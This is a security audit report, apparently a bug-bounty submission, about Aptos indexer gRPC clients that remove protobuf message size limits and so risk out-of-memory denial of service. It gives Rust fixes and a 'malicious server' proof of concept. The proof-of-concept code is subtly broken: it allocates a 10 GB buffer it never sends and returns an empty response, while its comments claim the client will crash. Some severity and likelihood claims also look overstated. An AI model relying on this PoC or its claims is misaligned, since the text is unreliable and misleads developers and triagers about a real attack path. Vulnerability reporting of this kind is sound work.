# Audit Report

## Title
Unlimited Protobuf Message Size in Indexer gRPC Clients Enables Out-of-Memory Denial of Service

## Summary
The Aptos indexer gRPC clients are configured with `usize::MAX` as the maximum message decoding size, effectively removing all protobuf deserialization limits. This allows a malicious or compromised indexer server to send arbitrarily large messages that will cause client processes to exhaust memory and crash, resulting in a Denial of Service condition for indexer consumers.

## Finding Description

The Aptos indexer infrastructure uses gRPC for communication between indexer servers and clients. The Tonic library (used for gRPC) provides configurable message size limits with a default of 4MB for decoding. However, the indexer client implementations explicitly override this safe default with unlimited size.

**Client-side vulnerability:**

In the indexer gRPC client creation functions, the maximum decoding message size is set to `usize::MAX`: [1](#0-0) [2](#0-1) 

The default Tonic limit is 4MB as documented in the generated code: [3](#0-2) 

**Attack scenario:**
1. A legitimate indexer client connects to what it believes is a trusted indexer server
2. The server (either compromised or malicious) sends a protobuf message claiming to be several gigabytes in size
3. The client attempts to allocate memory for the entire message before deserialization
4. The client process exhausts available memory and crashes with an Out-of-Memory error
5. This affects any service consuming indexer data (wallets, block explorers, analytics tools)

**Server-side concern:**

While servers do enforce a 256 MB limit, there are no concurrent connection or stream limits: [4](#0-3) [5](#0-4) 

An attacker could open multiple concurrent connections and send 256 MB messages on each to exhaust server memory, though this is a secondary concern compared to the unlimited client-side decoding.

This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." While not directly about gas, memory is a critical computational resource that must be bounded.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program criteria:
- **"API crashes"**: The indexer gRPC API clients will crash when receiving oversized messages
- **"Validator node slowdowns"**: If validators run indexer clients, they could be affected

The impact includes:
- **Availability**: Indexer consumer services (wallets, explorers, analytics platforms) can be taken offline
- **Cascading failures**: If multiple services share infrastructure, OOM in one process can affect others
- **Ecosystem disruption**: The Aptos ecosystem depends on indexer services for transaction history and chain state queries
- **No authentication required**: Any network endpoint accepting as a "server" can exploit this

While this doesn't directly compromise consensus or funds, it severely impacts the usability and availability of the Aptos blockchain ecosystem.

## Likelihood Explanation

**Likelihood: HIGH**

The vulnerability is highly likely to be exploited because:
1. **No authentication required**: Any malicious actor can set up a fake indexer server
2. **Easy to trigger**: Simply send a protobuf message with a large size header
3. **Client trust model**: Clients may connect to semi-trusted or load-balanced endpoints
4. **No rate limiting**: No per-message or per-connection limits prevent rapid exploitation
5. **Immediate impact**: Single oversized message causes immediate OOM

The attack requires minimal sophistication - just crafting a protobuf message with an inflated size field. Tools like `grpcurl` or custom gRPC clients can be used for exploitation.

## Recommendation

**Immediate fix - Restore reasonable message size limits on clients:**

```rust
// In ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs

// Define a reasonable maximum message size (e.g., 256 MB to match server)
const MAX_GRPC_MESSAGE_SIZE: usize = 256 * (1 << 20); // 256 MiB

pub async fn create_grpc_client(address: Url) -> GrpcClientType {
    backoff::future::retry(backoff::ExponentialBackoff::default(), || async {
        match FullnodeDataClient::connect(address.to_string()).await {
            Ok(client) => {
                tracing::info!(
                    address = address.to_string(),
                    "[Indexer Cache] Connected to indexer gRPC server."
                );
                Ok(client
                    .max_decoding_message_size(MAX_GRPC_MESSAGE_SIZE)  // Changed from usize::MAX
                    .max_encoding_message_size(MAX_GRPC_MESSAGE_SIZE)  // Changed from usize::MAX
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip)
                    .accept_compressed(CompressionEncoding::Zstd))
            },
            // ... error handling
        }
    })
    .await
    .unwrap()
}
```

Apply the same fix to `create_data_service_grpc_client()`.

**Additional server-side hardening:**

```rust
// In ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs

// Add concurrent stream limits
const MAX_CONCURRENT_STREAMS: u32 = 100;

// In the run() method:
let mut server_builder = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .http2_concurrent_streams(Some(MAX_CONCURRENT_STREAMS)); // Add this
```

**Long-term improvements:**
1. Implement per-client rate limiting based on IP or authentication token
2. Add connection pooling with maximum connection limits
3. Use streaming with bounded buffers instead of loading entire messages
4. Monitor memory usage and implement circuit breakers

## Proof of Concept

**Step 1: Create a malicious gRPC server**

```rust
// malicious_server.rs
use tonic::{transport::Server, Request, Response, Status};
use aptos_protos::indexer::v1::{
    raw_data_server::{RawData, RawDataServer},
    GetTransactionsRequest, TransactionsResponse,
};
use futures::Stream;
use std::pin::Pin;

pub struct MaliciousIndexerServer;

#[tonic::async_trait]
impl RawData for MaliciousIndexerServer {
    type GetTransactionsStream = 
        Pin<Box<dyn Stream<Item = Result<TransactionsResponse, Status>> + Send>>;

    async fn get_transactions(
        &self,
        _request: Request<GetTransactionsRequest>,
    ) -> Result<Response<Self::GetTransactionsStream>, Status> {
        // Send a message claiming to be 10 GB
        let huge_data = vec![0u8; 10 * 1024 * 1024 * 1024]; // 10 GB allocation attempt
        
        let response = TransactionsResponse {
            transactions: vec![],
            chain_id: Some(1),
            processed_range: None,
        };
        
        // This will cause the client to attempt allocating 10 GB
        Ok(Response::new(Box::pin(futures::stream::once(async {
            Ok(response)
        }))))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "[::1]:50051".parse()?;
    let server = MaliciousIndexerServer;

    Server::builder()
        .add_service(RawDataServer::new(server))
        .serve(addr)
        .await?;

    Ok(())
}
```

**Step 2: Observe client crash**

```rust
// When a legitimate client connects using the vulnerable code:
let client = create_data_service_grpc_client(
    Url::parse("http://[::1]:50051")?,
    None
).await?;

// This call will cause OOM as the client tries to allocate 10 GB
let response = client.get_transactions(request).await?; // CRASH HERE
```

The client will crash with `SIGKILL` or "Out of memory" error when the OS terminates the process for excessive memory allocation.

**Notes**

The vulnerability exists because the design prioritized flexibility over security. While unlimited message sizes might seem useful for handling large transaction batches, it creates an unacceptable security risk. The server-side limit of 256 MB is reasonable and should be mirrored on the client side. Additionally, implementing concurrent connection limits and streaming with bounded buffers would provide defense-in-depth against resource exhaustion attacks.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs (L45-46)
```rust
                    .max_decoding_message_size(usize::MAX)
                    .max_encoding_message_size(usize::MAX)
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs (L85-86)
```rust
                    .max_decoding_message_size(usize::MAX)
                    .max_encoding_message_size(usize::MAX))
```

**File:** protos/rust/src/pb/aptos.indexer.v1.tonic.rs (L75-82)
```rust
        /// Limits the maximum size of a decoded message.
        ///
        /// Default: `4MB`
        #[must_use]
        pub fn max_decoding_message_size(mut self, limit: usize) -> Self {
            self.inner = self.inner.max_decoding_message_size(limit);
            self
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L240-241)
```rust
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
```
